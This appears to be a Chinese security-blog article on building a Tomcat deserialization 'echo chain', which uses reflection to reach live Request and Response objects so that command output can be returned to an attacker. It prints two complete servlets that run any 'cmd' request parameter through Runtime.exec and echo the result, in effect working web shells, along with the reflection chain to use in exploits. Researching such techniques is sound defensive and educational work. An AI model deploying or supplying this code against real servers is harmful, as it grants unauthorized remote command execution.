<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ThGYkbEaRf07Wxm0IJeG-Q)

xDemo
=====

```
package com.naihe;  
  
import javax.servlet.ServletException;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.BufferedInputStream;  
import java.io.IOException;  
import java.io.InputStream;  
  
@WebServlet("/cmd")  
public class tomcat extends HttpServlet {  
    @Override  
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException, IOException {  
        String cmd = req.getParameter("cmd");  
        InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();  
        BufferedInputStream bis = new BufferedInputStream(is);  
        int len;  
        while ((len = bis.read())!=-1){  
            resp.getWriter().write(len);  
        }  
    }  
  
    @Override  
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
        this.doGet(req,resp);  
  
    }  
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7JEaNgibsW2QfyLS1Fs62IUibu27POX3dSIegY3czpamXVYGSVsiaPE1bBKdZEJicicGd479pibRMhtFMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

> 当看到这里应该会有人回想，就这？不就是servlet加命令执行么，确实如此，但本文主要讨论的是在反序列化的情况下，如何进行数据回显，因为在反序列化漏洞中无法直接调用HttpServletRequest和HttpServletResponse，只能通过反射获取Request和Response中的内容，上面的代码只是为了方便我们去挖掘和分析Request和Response的传递过程，分析出一条回显链

> 这里的@WebServlet("/cmd")需要开注解路由,在web.xml配置如下

```
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
    xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
    xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
    id="WebApp_ID" metadata-complete="false" version="4.0">  
    <!-- metadata-complete取值为true，表示关闭注解支持 -->  
    <!-- metadata-complete取值为false，表示启用注解支持 -->  
</web-app>
```

分析流程
====

> 直接再index.jsp上下断点

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7JEaNgibsW2QfyLS1Fs62IUBsZEMTFIdQhrt9BA1hOPE8cvNuhHyYslBlqjtqszHRHUI3WhZzIj0w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

> 可以看到Http11Processor中已经包含了request和response，可知道，再前面已经有其他类处理过了request和response将其内容传给Http11Processor，因此我们往前看Http11Processor内容从何而来

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7JEaNgibsW2QfyLS1Fs62IUMq5J6wp84HnCxxicTbktp0CPYE7cVzg8NQpgO1jicPT79tKydibLibfOpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

> AbstractProcessorLight.process

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> AbstractProtocol$ConnectionHandler 在这里查看processor内容

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 现在我们看是processor是怎么赋值的 AbstractProtocol$ConnectionHandler

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 进入register方法 register方法大概就是生成一个RequestInfo对象然后再里面填充内容

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 这里我们看一下this.global是什么

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 可以看到是一个RequestGroupInfo类

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 进入RequestGroupInfo，可以看到有个processors，是存储RequestInfo对象得列表，接下来看看RequestInfo是什么

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 进入RequestInfo，发现里面有个Request，这是我们想要得那个Request么，跟进去看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 进入Request，发现居然没有继承HttpServletResponse，那这应该就不是我们要找的Request，那开发者不可能取一个完全没有关系得类名吧，这岂不是让其他程序员天天坐牢啊

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 通过网上得资料了解到这个Requests会调用getNote方法返回一个继承至 HttpServletResponse的Response类

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 这就是我们要的Response类

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 接下来我们分析setGlobalProcessor

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 就是把生成的自己添加到RequestInfo中

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> RequestInfo

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 上面如何获得Request已经分析完了，接下来我们分析如何让java加载上面的数据

> 我们只需要找到一个类会被tomcat自动加载 在tomcat源码中可以看到会调用service.addConnector，很明显会用到connector

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 进入Connector，可以发现ProtocolHandler里面存储的是Http11NioProtocol

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 下面就是一下继承关系

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 可以看到最终Http11NioProtocol还是继承自AbstractProtocol

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 这样一来就可以通过ProtocolHandler来存放我们之前的信息了 service只是一个接口，而StandardService才是其实现类，所以说service就是StandardService

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 因此我们只需要要获取StandardService就行了

> 而StandardService可以从WebappClassLoaderBase上下文类加载器中间接获取获取

> WebappClassLoaderBase只能获取StandardContext，而回显入口为StandardService，因此我们需要使用ApplicationContext将其封装一遍，在进而获取StandardService

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

构造方法  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> standardService为Service的实现类

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

总结  

=====

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

回显链  

======

```
package com.naihe;  
  
  
import org.apache.catalina.connector.Connector;  
import org.apache.catalina.core.ApplicationContext;  
import org.apache.catalina.core.StandardContext;  
import org.apache.catalina.core.StandardService;  
import org.apache.catalina.loader.WebappClassLoaderBase;  
import org.apache.coyote.Request;  
import org.apache.coyote.RequestGroupInfo;  
import org.apache.coyote.RequestInfo;  
import javax.servlet.ServletException;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.BufferedInputStream;  
import java.io.IOException;  
import java.io.InputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationTargetException;  
import java.util.List;  
  
  
@WebServlet("/demo")  
public class test extends HttpServlet {  
    @Override  
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
  
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  
        org.apache.catalina.core.StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();  
  
        try {  
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");  
            context.setAccessible(true);  
            ApplicationContext ApplicationContext = (ApplicationContext)context.get(standardContext);  
              
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");  
            service.setAccessible(true);  
            org.apache.catalina.core.StandardService standardService = (StandardService) service.get(ApplicationContext);  
              
            Field connectors = standardService.getClass().getDeclaredField("connectors");  
            connectors.setAccessible(true);  
            Connector[] connector = (Connector[]) connectors.get(standardService);  
              
            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");  
            protocolHandler.setAccessible(true);  
              
            Class<?>[] declaredClasses = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();  
              
            for (Class<?> declaredClass : declaredClasses) {  
  
                if (declaredClass.getName().length()==52){  
                      
                    java.lang.reflect.Method getHandler = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);  
                    getHandler.setAccessible(true);  
                      
                    Field global = declaredClass.getDeclaredField("global");  
                    global.setAccessible(true);  
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) global.get(getHandler.invoke(connector[0].getProtocolHandler(), null));  
  
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");  
                    processors.setAccessible(true);  
                    java.util.List<org.apache.coyote.RequestInfo>  requestInfo = (List<RequestInfo>) processors.get(requestGroupInfo);  
                    Field req1 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");  
                    req1.setAccessible(true);  
  
  
                    for (RequestInfo info : requestInfo) {  
  
                        org.apache.coyote.Request request = (Request) req1.get(info);  
  
                        org.apache.catalina.connector.Request request1 = (org.apache.catalina.connector.Request) request.getNote(1);  
                          
                        org.apache.catalina.connector.Response response = request1.getResponse();  
  
                        String cmd = request1.getParameter("cmd");  
                        InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();  
                        BufferedInputStream bis = new BufferedInputStream(is);  
                        int len;  
                        while ((len = bis.read())!=-1){  
                            response.getWriter().write(len);  
                        }  
                    }  
                }  
            }  
  
        } catch (NoSuchFieldException e) {  
            e.printStackTrace();  
        } catch (IllegalAccessException | ClassNotFoundException e) {  
            e.printStackTrace();  
        } catch (NoSuchMethodException e) {  
            e.printStackTrace();  
        } catch (InvocationTargetException e) {  
            e.printStackTrace();  
        }  
    }  
    @Override  
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
        this.doGet(req, resp);  
    }  
  
}
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

Servlet内存马探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489892&idx=1&sn=ce3ea0998720474e8c1d68787dc9f26f&chksm=ce64a3d8f9132ace3be655ab82070b65301d93736716f580d99599de089ce742a637ee761ad3&scene=21#wechat_redirect)

[

记一次docker逃逸学习



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489865&idx=1&sn=d84d66dd86bb5d025cd514c00e0c28cb&chksm=ce64a3f5f9132ae39de41629a389af8667271ca444dc129649c821cc815bb740deb8d9991027&scene=21#wechat_redirect)

[

多核环境下的hook探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489639&idx=1&sn=d46c9c508f031ed50a31bc0b0cd28737&chksm=ce64a2dbf9132bcdd486d36c39a1ae418a83404efd2b1afd535c53f029123a3177f4e154a9f2&scene=21#wechat_redirect)

[

从jndi到log4j2



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489628&idx=1&sn=ec7e5a44477e626864c82308a252128f&chksm=ce64a2e0f9132bf61e84bf4c5a9ce3b5c176ecb351c768b3851cd81c2c2ef0ec40ee076f0998&scene=21#wechat_redirect)

[

shiro从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489388&idx=1&sn=d76bbc711e911f96f805f1122fdaea06&chksm=ce64add0f91324c6db3a637c16178df0931e4f0d5cf23704ca95f99e7f2c3f0fedbb1e2d1567&scene=21#wechat_redirect)

[

基于PEB断链实现进程/模块隐藏



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489342&idx=1&sn=d4711ef8f856039f1b15b091191909a8&chksm=ce64ad82f913249484f2ec4c5cc4a3f0a0a175874e729aa26079df5a1f11b7a5035278d5659a&scene=21#wechat_redirect)

[

fastjson从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489226&idx=1&sn=042eb6e2022c38e879c865d192e2385d&chksm=ce64ac76f91325602db20e48f485d29a4aea921f4300374c4fa5202ed3f83340f6f82f1afe58&scene=21#wechat_redirect)

[

HVV面试题总结



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489182&idx=1&sn=52dfe5cc8af26c56b8f7f2643e7f9567&chksm=ce64ac22f9132534a9b8319a4beb9055e447efa034783b49ed78c53cb92da1c0c88a87ffbb6e&scene=21#wechat_redirect)

[

Java安全之Commons Collections4-7分析



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489172&idx=1&sn=a2f48139a4437bc5b74e982f6149e6cf&chksm=ce64ac28f913253ea07a8022f08918b9f56d27059a03012f5e7654eaf3d764eaabeaa2e88e01&scene=21#wechat_redirect)

[Java安全之Commons Collections1-3分析](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489140&idx=1&sn=9786bcdd660eee8873805287561278cd&chksm=ce64acc8f91325def00d2e553ec347be15c045ef3622cb8307901d7eb6c4267b5306190d6e54&scene=21#wechat_redirect)

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 42篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)